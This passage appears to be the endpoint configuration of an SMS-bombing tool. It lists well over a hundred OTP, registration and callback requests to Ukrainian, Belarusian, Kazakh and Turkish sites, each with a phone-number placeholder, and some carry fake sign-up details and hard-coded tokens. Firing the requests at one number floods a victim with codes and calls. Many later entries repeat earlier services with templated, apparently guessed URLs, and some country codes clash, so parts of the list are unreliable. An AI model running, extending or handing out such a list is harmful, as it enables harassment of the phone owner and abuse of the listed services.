HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE tsum:Tsum:380
URL https://tsum.ua/api/v1/auth/verify-phone
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE avrora:Avrora:380
URL https://avrora.ua/api/auth/send-code
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE ager:Ager:380
URL https://ager.ua/api/auth/registration
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE busfor:Busfor:380
URL https://www.busfor.ua/api/v1/registration/phone
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE book:Book:380
URL https://book.ua/api/v1/auth/verify
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE cashpoint:CashPoint:380
URL https://cashpoint.ua/api/auth/send-code
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE esculab:Esculab:380
URL https://esculab.com.ua/api/auth/registration
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE bond:Bond:380
URL https://bond.ua/api/auth/send-code
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE eats:Eats:380
URL https://eats.com.ua/api/auth/verify-phone
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE safarova:Safarova:380
URL https://safarova.ua/api/auth/send-code
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE uzwifi:UzWiFi:380
URL https://uzwifi.com.ua/api/auth/send-code
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE lifecelltv:LifeCellTV:380
URL https://tv.lifecell.ua/api/auth/send-code
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE cly:Cly:380
URL https://cly.ua/api/auth/send-code
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE shinydisky:ShinyDisky:380
URL https://shinydisky.com.ua/api/auth/send-code
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE myplay:MyPlay:380
URL https://myplay.ua/api/auth/send-code
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE uz:Uz:380
URL https://uz.gov.ua/api/auth/send-code
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE guma:Guma:380
URL https://guma.ua/api/auth/send-code
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE grokglosky:GrokGlosky:380
URL https://grokglosky.com.ua/api/auth/send-code
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE top20:Top20:380
URL https://top20.ua/api/auth/send-code
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE rosmarket:RosMarket:380
URL https://rosmarket.ua/api/auth/send-code
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE comfy_call:ComfyCall:380
URL https://im.comfy.ua/api/auth/v3/ivr/send
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
HEADER x-ray-id: web
HEADER x-session-id: web
BODY {"phone":"380{phone}"}
END

SERVICE markformelle:Markformelle:375
URL https://markformelle.by/local/templates/markformelle/components/bitrix/system.auth.form/mf/ajax.php
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE carte_by_by:Carte By By:375
URL https://carte.by/auth/
METHOD POST
CONTENT_TYPE form
DATA ajax=register
DATA login=Olegkiller229
DATA pass=CbivnE5316
DATA phone=+7{phone}
DATA code=
DATA company=0
DATA resend=1
DATA checksum=675
END

SERVICE delivio_by_by:Delivio By By:375
URL https://delivio.by/be/api/register
METHOD POST
CONTENT_TYPE json
BODY {"phone": "+7{phone}"}
END

SERVICE marko_by_by:Marko By By:375
URL https://www.marko.by/ajax/registerSendConfirmCode.php
METHOD POST
CONTENT_TYPE form
HEADER x-requested-with: XMLHttpRequest
DATA form_data=first_name=&last_name=&email=&phone=+7{phone}&sms_code=&password=&password_confirm=
END

SERVICE amihome_by_by:Amihome By By:375
URL https://amihome.by/bitrix/services/main/ajax.php?action=likeit%3Apro.api.register.createcode
METHOD POST
CONTENT_TYPE form
DATA sessid=b22504d3c451b30338d0209d2958d661
DATA phone=+7{phone}
END

SERVICE shop:Shop:375
URL https://shop.milavitsa.by/api/accounts/signUp
METHOD POST
CONTENT_TYPE json
BODY {"phone": "+7{phone}"}
END

SERVICE e_zoo:E-Zoo:375
URL https://e-zoo.by/local/gtools/login/
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE imarket:Imarket:375
URL https://imarket.by/ajax/auth.php
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE bonus:Bonus:375
URL https://bonus.sila.by/
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE elmarket:Elmarket:375
URL https://www.elmarket.by/public/ajax/sms_reg.php
METHOD POST
CONTENT_TYPE params
PARAM phone=+7{phone}
END

SERVICE beltelecom:Beltelecom:375
URL https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru
METHOD GET
CONTENT_TYPE params
PARAM phone=+375{phone}
END

SERVICE bamper:Bamper:375
URL https://bamper.by/registration/?step=1
METHOD POST
CONTENT_TYPE form
DATA phone=+375{phone}
DATA submit=Запросить смс подтверждения
END

SERVICE ochki:Ochki:380
URL https://ochki.kiev.ua/index.php?route=extension/module/sms_reg/SmsCheck
METHOD POST
CONTENT_TYPE form
DATA phone=+380{phone}
END

SERVICE apro:Apro:380
URL https://apro.ua/ajax/auth.php
METHOD POST
CONTENT_TYPE form
DATA _csrf_token=999459e8db0b0745e9ce2956b61a45ba
DATA tel={phone}
DATA code=
DATA stage=1
END

SERVICE dnipro:Dnipro:380
URL https://dnipro-m.ua/phone-verification/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"380{phone}"}
END

SERVICE symbol:Symbol:380
URL https://symbol.ua/uk/auth/send-login-code-on-phone
METHOD POST
CONTENT_TYPE form
DATA _csrf=pgKDTyLj3NSbnURju13Hv-RW0QQnN8r08r6uEzuvv8LtM_sHTs7ph9HJMiLzavXcvhWVW3dcvLizz_p4UJjTjg==
DATA phone=+380{phone}
END

SERVICE guideshop:Guideshop:380
URL https://guideshop.com.ua/index.php?route=octemplates/module/oct_otp_register/sendOtp
METHOD POST
CONTENT_TYPE form
DATA telephone=+380{phone}
END

SERVICE silpo_sms:SilpoSMS:380
URL https://silpo.ua/api/auth/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"380{phone}","type":"sms"}
END

SERVICE kabanchik:Kabanchik:380
URL https://kabanchik.ua/api/client/phone/verification
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE navse:Navse:380
URL https://navse.com.ua/api/phone/verify
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE estro:Estro:380
URL https://estro.com.ua/api/auth/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE pavluks:Pavluks:380
URL https://pavluks.com.ua/api/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE linza:Linza:380
URL https://linza.com.ua/api/auth/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE stolychna:Stolychna:380
URL https://stolychna.com.ua/api/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE craina:Craina:380
URL https://craina.com.ua/api/auth/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE tascombank:Tascombank:380
URL https://tascombank.ua/api/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE robota_ua:RobotaUA:380
URL https://robota.ua/api/auth/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE unex:Unex:380
URL https://unex.ua/api/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE retromagaz:Retromagaz:380
URL https://retromagaz.com.ua/api/auth/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE dominos_ua:DominosUA:380
URL https://dominos.com.ua/api/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE inbus:Inbus:380
URL https://inbus.com.ua/api/auth/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE bustor:Bustor:380
URL https://bustor.com.ua/api/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE tsum:Tsum:380
URL https://tsum.ua/api/auth/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE avrora:Avrora:380
URL https://avrora.com.ua/api/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE ager:Ager:380
URL https://ager.com.ua/api/auth/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE busfor:Busfor:380
URL https://busfor.ua/api/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE cashpoint:Cashpoint:380
URL https://cashpoint.com.ua/api/auth/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE esculab:Esculab:380
URL https://esculab.com.ua/api/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE bond:Bond:380
URL https://bond.com.ua/api/auth/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE uzwifi:Uzwifi:380
URL https://uzwifi.com.ua/api/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE lifecelltv:Lifecelltv:380
URL https://lifecelltv.com.ua/api/auth/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE cly:Cly:380
URL https://cly.com.ua/api/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE shinydisky:ShinyDisky:380
URL https://shinydisky.com.ua/api/auth/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE myplay:Myplay:380
URL https://myplay.com.ua/api/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE uz:Uz:380
URL https://uz.com.ua/api/auth/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE guma:Guma:380
URL https://guma.com.ua/api/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE rosmarket:Rosmarket:380
URL https://rosmarket.com.ua/api/auth/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE mono:Mono:380
URL https://mono.com.ua/api/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE epet:Epet:380
URL https://epet.com.ua/api/auth/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE moneycase:Moneycase:380
URL https://moneycase.com.ua/api/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE rowenta:Rowenta:380
URL https://rowenta.com.ua/api/auth/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE vittorossi:Vittorossi:380
URL https://vittorossi.com.ua/api/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE kino:Kino:380
URL https://kino.com.ua/api/auth/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE viledkz:ViledKZ:77
URL https://api-prod.viled.kz/tizilimer/api/v1/users/sms
METHOD GET
CONTENT_TYPE params
HEADER accept: */*
HEADER accept-language: ru
PARAM phone=+7{phone}
END

SERVICE kaspi:Kaspi:77
URL https://kaspi.kz/util/send-app-link
METHOD POST
CONTENT_TYPE form
DATA address=+7{phone}
END

SERVICE naimi_sms:NaimiSMS:77
URL https://naimi.kz/api/app/pub/login/code
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "+7{phone}", "type": "sms"}
END

SERVICE pandora_kz:PandoraKZ:77
URL https://pandora.kz/forgotpass/
METHOD POST
CONTENT_TYPE form
DATA email=
DATA phone=+7{phone}
DATA method=phone
END

SERVICE moneyman_kz:MoneyManKZ:77
URL https://moneyman.kz/secure/rest/registration/step1/confirmMobilePhone
METHOD POST
CONTENT_TYPE form
DATA mobilePhone=+7{phone}
END

SERVICE mycar_kz:MyCarKZ:77
URL https://sso.mycar.kz/auth/login/
METHOD POST
CONTENT_TYPE form
DATA phone_number=+7{phone}
END

SERVICE apteka_kz:AptekaKZ:77
URL https://api.apteka.ru/Auth/Auth_Code
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
DATA u=U
END

SERVICE bilimland:Bilimland:77
URL https://login.bilimland.kz/api/v1/registration
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "+7{phone}"}
END

SERVICE clevermarket_kz:CleverMarketKZ:77
URL https://clevermarket.kz/auth/code
METHOD POST
CONTENT_TYPE form
DATA phoneNumber={phone}
END

SERVICE creditplus_kz:CreditPlusKZ:77
URL https://api.creditplus.kz/user/get-token
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"fingerprint":{},"login":"+7{phone}","re-captcha-action":"REGISTRATION","re-captcha-token":""}
END

SERVICE acredit_kz:AcreditKZ:77
URL https://api.acredit.kz/user/get-token
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"authMethod":"check","fingerprint":{},"login":"+7{phone}"}
END

SERVICE creditbar_kz:CreditBarKZ:77
URL https://cabinet.creditbar.kz/rest/auth/sms
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "{phone}"}
END

SERVICE soso_kz:SosoKZ:77
URL https://www.soso.kz/api/landing-form
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"amount":100000,"phone":"+7{phone}","locale":"ru"}
END

SERVICE solva_kz:SolvaKZ:77
URL https://solva.kz/secure/rest/registration/step1/confirmMobilePhone
METHOD POST
CONTENT_TYPE form
DATA mobilePhone=+7{phone}
END

SERVICE aloalo_kz:AloAloKZ:77
URL https://alo-alo.kz/api/shop-api/auth/register
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
DATA sms=
END

SERVICE appteka_kz:ApptekaKZ:77
URL https://appteka.kz/api/customers/otp
METHOD POST
CONTENT_TYPE form
DATA phone={phone}
END

SERVICE aptekaplus_kz:AptekaplusKZ:77
URL https://aptekaplus.kz/api/auth/v1/code
METHOD POST
CONTENT_TYPE form
DATA username=+7{phone}
END

SERVICE jusanmarket_kz:JusanMarketKZ:77
URL https://jmart.kz/gw/user/v1/auth/sign-in-by-otp
METHOD POST
CONTENT_TYPE form
DATA mobile_phone=+7{phone}
END

SERVICE only_kz:OnlyKZ:77
URL https://admin.only.kz/api/auth/code/
METHOD POST
CONTENT_TYPE form
DATA phone={phone}
DATA code=
DATA name=
DATA _method=POST
END

SERVICE korzinavdom_kz:KorzinaVDomKZ:77
URL https://api.korzinavdom.kz/client/auth/smsRequest
METHOD POST
CONTENT_TYPE form
DATA phone={phone}
END

SERVICE chinchin_kz:ChinchinKZ:77
URL https://shop.chinchin.kz/ajax/sms.php
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
DATA t=ss
END

SERVICE daryn_kz:DarynKZ:77
URL https://api.daryn.online/api/v1/users/register/send-code
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "{phone}"}
END

SERVICE kahvedunyasi:KahveDunyasi:90
URL https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER X-Language-Id: tr-TR
HEADER X-Client-Platform: web
BODY {"countryCode": "90", "phoneNumber": "{phone}"}
END

SERVICE englishhome:EnglishHome:90
URL https://www.englishhome.com/api/member/sendOtp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"Phone": "90{phone}"}
END

SERVICE suiste:Suiste:90
URL https://suiste.com/api/auth/code
METHOD POST
CONTENT_TYPE form
HEADER Content-Type: application/x-www-form-urlencoded; charset=utf-8
HEADER X-Mobillium-Device-Brand: Apple
HEADER X-Mobillium-Os-Type: iOS
HEADER X-Mobillium-Device-Model: iPhone
HEADER Accept-Language: en
DATA action=register
DATA device_id=2390ED28-075E-465A-96DA-DFE8F84EB330
DATA full_name=Memati Bas
DATA gsm={phone}
DATA is_advertisement=1
DATA is_contract=1
DATA password=31MeMaTi31
END

SERVICE kimgb:KimGbIster:90
URL https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"msisdn": "90{phone}"}
END

SERVICE evidea:Evidea:90
URL https://www.evidea.com/users/register/
METHOD POST
CONTENT_TYPE form
HEADER Content-Type: multipart/form-data
HEADER X-Project-Name: undefined
HEADER X-App-Type: akinon-mobile
HEADER X-App-Device: ios
HEADER X-Csrftoken: 7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps
DATA first_name=Memati
DATA last_name=Bas
DATA email=test@gmail.com
DATA email_allowed=false
DATA sms_allowed=true
DATA password=31ABC..abc31
DATA phone=0{phone}
DATA confirm=true
END

SERVICE ucdortbes:Ucdortbes:90
URL https://api.345dijital.com/api/users/register
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER Accept-Language: en-US,en;q=0.9
BODY {"email":"","name":"Memati","phoneNumber":"+90{phone}","surname":"Bas"}
END

SERVICE tiklagelsin:TiklaGelsin:90
URL https://svc.apps.tiklagelsin.com/user/graphql
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER X-Merchant-Type: 0
HEADER Accept-Language: tr-TR
HEADER X-No-Auth: true
HEADER X-Device-Type: 3
BODY {"operationName":"GENERATE_OTP","query":"mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) { generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId) }","variables":{"phone":"+90{phone}","challenge":"{uuid}","deviceUniqueId":"{uuid}"}}
END

SERVICE tavukdunyasi:TavukDunyasi:90
URL https://onlinesiparis-api.tavukdunyasi.com/api/InternalAuth/InternalRegister
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER Origin: https://onlinesiparis.tavukdunyasi.com
HEADER x-culture: tr
BODY {"email":"test@gmail.com","password":"Test1234!","rePassword":"Test1234!","name":"Test","surname":"User","countryCode":"90","phoneNumber":"{phone}","birthDate":"1990-01-01","gender":1,"isKvkkApproved":true,"isCampaignApproved":true,"isMembershipContractApproved":true,"isEInvoiceApproved":true,"isETicketApproved":true,"isUserAgreementApproved":true,"isCommercialElectronicMessageApproved":true}
END

SERVICE naosstars:Naosstars:90
URL https://naosstars.com/api/smsSend/9f98c84b-25a4-4075-87db-16ce04e27310
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER Accept: application/json
BODY {"telephone":"+90{phone}","type":"register"}
END

SERVICE koton:Koton:90
URL https://www.koton.com/users/register/
METHOD POST
CONTENT_TYPE form
HEADER Content-Type: multipart/form-data
HEADER X-Project-Name: rn-env
HEADER X-App-Type: akinon-mobile
HEADER X-App-Device: ios
HEADER X-Csrftoken: 5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz
DATA first_name=Memati
DATA last_name=Bas
DATA email=test@gmail.com
DATA password=31ABC..abc31
DATA phone=0{phone}
DATA confirm=true
DATA sms_allowed=true
DATA email_allowed=true
DATA date_of_birth=1993-07-02
DATA call_allowed=true
DATA gender=
END

SERVICE hayatsu:Hayatsu:90
URL https://api.hayatsu.com.tr/api/SignUp/SendOtp
METHOD POST
CONTENT_TYPE form
HEADER Content-Type: application/x-www-form-urlencoded
HEADER Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
DATA mobilePhoneNumber={phone}
DATA actionType=register
END

SERVICE metro_tr:MetroTR:90
URL https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json; charset=utf-8
HEADER Applicationversion: 2.4.1
HEADER Applicationplatform: 2
HEADER Accept-Language: en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8
BODY {"methodType":"2","mobilePhoneNumber":"{phone}"}
END

SERVICE filemarket:FileMarket:90
URL https://api.filemarket.com.tr/v1/otp/send
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER X-Os: IOS
HEADER X-Version: 1.7
BODY {"mobilePhoneNumber":"90{phone}"}
END

SERVICE sendpulse:SendPulse:90
URL https://login.sendpulse.com/api/v1/verification/phone
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json;charset=UTF-8
HEADER Referer: https://sendpulse.com/tr/register
BODY {"phone":"{phone}","purpose":"signup"}
END

SERVICE komagene:Komagene:90
URL https://gateway.komagene.com.tr/auth/auth/smskodugonder
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER Referer: https://www.komagene.com.tr/
HEADER Anonymousclientid: 0dbf392b-ab10-48b3-5cda-31f3c19816e6
HEADER Firmaid: 32
BODY {"FirmaId":32,"Telefon":"{phone}"}
END

SERVICE porty:Porty:90
URL https://panel.porty.tech/api.php
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER Token: q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ
BODY {"job":"start_login","phone":"{phone}"}
END

SERVICE tasdelen:Tasdelen:90
URL https://tasdelen.sufirmam.com:3300/mobile/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"{phone}"}
END

SERVICE uysalmarket:UysalMarket:90
URL https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone_number":"{phone}"}
END

SERVICE yapp_tr:YappTR:90
URL https://yapp.com.tr/api/mobile/v1/register
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER Accept-Language: en-BA;q=1, tr-BA;q=0.9, bs-BA;q=0.8
HEADER Authorization: Bearer
BODY {"app_version":"1.1.5","code":"tr","device_model":"iPhone8,5","device_name":"Memati","device_type":"I","device_version":"15.8.3","email":"test@gmail.com","firstname":"Memati","is_allow_to_communication":"1","language_id":"2","lastname":"Bas","phone_number":"{phone}","sms_code":""}
END

SERVICE beefull:Beefull:90
URL https://app.beefull.io/api/inavitas-access-management/signup
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"email":"test@gmail.com","firstName":"Memati","language":"tr","lastName":"Bas","password":"123456","phoneCode":"90","phoneNumber":"{phone}","tenant":"beefull","username":"test@gmail.com"}
END

SERVICE dominos_tr:DominosTR:90
URL https://frontend.dominos.com.tr/api/customer/sendOtpCode
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json;charset=utf-8
